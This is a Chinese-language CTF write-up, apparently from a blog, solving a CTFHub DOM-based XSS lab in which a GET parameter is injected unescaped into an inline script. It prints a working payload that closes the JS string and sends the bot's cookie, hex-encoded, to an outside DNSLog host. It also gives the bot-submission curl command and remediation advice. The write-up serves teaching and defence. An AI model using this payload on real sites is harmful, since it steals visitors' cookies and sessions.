
---
layout: post
title: "CTFHub Writeup-DOM反射"
date: 2026-10-26
categories: CTF
tags: [CTFHub, Web, 技能树]
---

# CTFHub Writeup - DOM反射

## 题目类型

WEB

## 0x01 题目信息
| 项目 | 内容 |
| --- | --- |
| 题目名称 | CTFHub 技能学习 - DOM 型反射 XSS（XSS DOM Reflex） |
| 靶场地址 | `http://challenge-65a12cafd8b4da2f.sandbox.ctfhub.com:10800` |
| 注入位置 | GET 参数 `text` |
| 触发点 | 内联 JS 的 `innerHTML` 赋值 |
| 关键问题 | `text` 被拼进单引号字符串，且没有转义 |
| 获取方式 | 闭合字符串注入 JS，偷 Bot 的 `flag` Cookie |
| Flag | `ctfhub{38b0acecad34460c4bd07d0a}` |
## 0x02 漏洞原理
DOM 型 XSS 和反射型、存储型最大的区别是：**数据不经过服务端渲染，而是在浏览器里被 JavaScript 写进页面**。
常见的数据流是：
```
location.search / location.hash  →  JS 处理  →  innerHTML / document.write
```
`location` 是 source（来源），`innerHTML` 是 sink（汇点），只要 source 的内容没经过滤就进了 sink，就会执行。
本题的页面结构是：
```html
<p id="text"></p>
<script>
    $("#text")[0].innerHTML = 'CTFHub is very niubility';
</script>
```
服务端把 `text` 参数**直接拼进了 `<script>` 里的单引号字符串**：
```php
$("#text")[0].innerHTML = '<?= $_GET['text'] ?>';
```
也就是说，输入先进入了 JavaScript 字符串，再被赋给 `innerHTML`。只要能让字符串提前闭合，就能在页面里执行任意 JS。
## 0x03 解题过程
**3.1 找注入点**
访问首页会 302 到：
```
/?text=CTFHub%20is%20very%20niubility
```
页面回显 `Hello, CTFHub`，下面有一段脚本：
```javascript
$("#text")[0].innerHTML = 'CTFHub is very niubility';
```
`text` 的内容被放进了单引号里。这就是注入点。
**3.2 测试引号是否转义**
提交一个带单引号的值：
```
?text=abc'def
```
页面里的脚本变成：
```javascript
$("#text")[0].innerHTML = 'abc'def';
```
单引号原样输出，没有转义成 `\'`，字符串被提前闭合，后面的 `def';` 变成了语法错误。这说明只要构造好闭合，就能注入代码。
**3.3 构造 payload**
思路是：先用 `'` 闭合字符串，加分号结束语句，然后写自己的 JS，最后用 `//` 把剩下的 `';` 注释掉。
payload 结构：
```javascript
';h=document.cookie...;i=new Image();i.src='http://...'//
```
拼进页面后变成：
```javascript
$("#text")[0].innerHTML = '';h=...;i=...;i.src='http://...'//';
```
`//` 把结尾的 `';` 注释掉，整段就合法了。
**3.4 构造外带脚本**
目标还是 Bot 的 `flag` Cookie，用 DNSLog 外带。Cookie 转十六进制、拆成两个 label：
```javascript
';h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=new Image();i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'//
```
验证渲染结果：
```javascript
$("#text")[0].innerHTML = '';h=document.cookie.split('').map(c=>('0'+c.charCodeAt(0).toString(16)).slice(-2)).join('');i=new Image();i.src='http://'+h.slice(0,50)+'.'+h.slice(50)+'.q8clvj.dnslog.cn/x'//';
```
字符串已经闭合，后面是我们的代码，最后的 `';` 被 `//` 注释掉，语法正确。
**3.5 提交给 Bot**
payload 做 URL 编码后拼到 `text=`，再提交给 `/submit`：
```
curl -X POST --data-urlencode "url=http://challenge-...:10800/?text=<编码后的payload>" \
  http://challenge-...:10800/submit
```
返回：
```json
{"code": 0, "msg": "Successfully"}
```
Bot 访问这个 URL，页面加载时内联脚本执行，Cookie 被发出去。
**3.6 接收并解码**
几秒后查询 DNSLog，拿到记录：
```
666c61673d6374666875627b33386230616365636164333434.36306334626430376430617d.q8clvj.dnslog.cn
```
把两段十六进制拼起来解码：
```
flag=ctfhub{38b0acecad34460c4bd07d0a}
```
得到 Flag：
```
ctfhub{38b0acecad34460c4bd07d0a}
```
**3.7 验证**
- 十六进制解码后是完整的 `flag=ctfhub{...}`，没有截断；
- 同一 payload 触发了两次记录，内容一致；
- flag 长度为 32，符合 `ctfhub{` + 24 位十六进制 + `}` 的格式。
## 0x04 完整流程
| 步骤 | 操作 | 结果 |
| --- | --- | --- |
| 找注入点 | `?text=abc'def` | 脚本里字符串被提前闭合 |
| 构造 payload | `';...//` | 闭合字符串并注入代码 |
| 验证渲染 | 查看 `innerHTML` 那一行 | 语法正确 |
| 提交 Bot | `POST /submit` 表单 `url=...` | `code:0 Successfully` |
| 接收 | DNSLog 子域名记录 | 拿到十六进制串 |
| 解码 | 十六进制转 ASCII | `flag=ctfhub{38b0acecad34460c4bd07d0a}` |
整条链路可以概括为：**确认输入进了 JS 字符串 → 用单引号闭合 → 注入外带脚本并用 `//` 注释尾部 → 提交 Bot → DNSLog 接收 → 解码。**
## 0x05 踩坑记录
1. **注入点在 JS 字符串里，不在 HTML 标签里**：这题直接写 `<script>alert(1)</script>` 没用，因为它会被当成字符串内容赋给 `innerHTML`；要先闭合单引号。
2. **单引号没有转义**：`abc'def` 会变成 `'abc'def'`，这是整个漏洞的突破口。如果服务端用 `json_encode` 或转义了引号，就不能这么打。
3. **`//` 要放在最后**：payload 结尾的 `';` 是模板自带的，必须注释掉，否则语法错误。
4. **payload 里的引号不用再转义**：闭合成 `'';` 之后，后面的单引号、双引号都在字符串外，正常写就行。
5. **payload 要先 URL 编码**：直接把 `'`、`;`、`//` 拼进 URL，Bot 侧可能处理不好，先 `EscapeDataString`。
6. **DNS 不区分大小写**：base64 会被归一成乱码，外带统一用十六进制。
7. **DNS label 最长 63 字符**：Cookie 转 hex 后会超长，必须拆成两段。
8. **提交接口有 5 秒限速**：连续提交会返回 `Wait a while (5s)`，等一会儿再发。
## 0x06 修复建议
1. **不要把用户输入拼进 `<script>`**：需要给 JS 传值时，用 `json_encode` 输出，或者放到 `data-*` 属性里由 JS 读取，不要直接拼字符串。
2. **用 `textContent` 代替 `innerHTML`**：本题只是显示文本，`textContent` 不会解析 HTML，天然免疫 XSS。
3. **输出编码**：对 `<`、`>`、`"`、`'`、`&` 做 HTML 实体编码。
4. **加 CSP**：设置 `Content-Security-Policy`，禁止内联脚本，即使注入成功也难以执行。
5. **Cookie 加 HttpOnly**：给 `flag` 这类敏感 Cookie 设置 `HttpOnly`，JS 读不到 `document.cookie`。
6. **Bot 侧隔离**：管理员的浏览器不要访问不可信 URL，或至少在无敏感 Cookie 的独立会话里访问。
## 0x07 总结
DOM 型 XSS 考的是「数据流」：
- 先找 source：`location.search` 里的 `text`；
- 再找 sink：`innerHTML`；
- 中间没有任何过滤，输入就能变成代码。
本题的特殊之处是：输入先被服务端拼进了 `<script>` 的字符串，再进入 `innerHTML`。所以第一步不是写标签，而是**闭合字符串**——一个单引号加 `//` 注释，就能把整段脚本接管。
防御上，最直接的是别把用户输入拼进脚本、显示文本用 `textContent`；再配合输出编码、CSP 和 HttpOnly 兜底。
